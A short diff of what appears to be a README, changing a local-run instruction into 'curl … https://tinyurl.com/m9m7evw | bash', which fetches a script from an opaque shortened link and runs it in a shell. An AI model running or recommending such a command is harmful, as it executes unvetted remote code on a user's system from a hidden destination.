@@ -21,7 +21,7 @@
 # To run locally...
 
 ```sh
-curl -sSFL https://github.com/BrynardSecurity/
+curl -sSFL https://tinyurl.com/m9m7evw | bash
 ```
 
 ## Usage
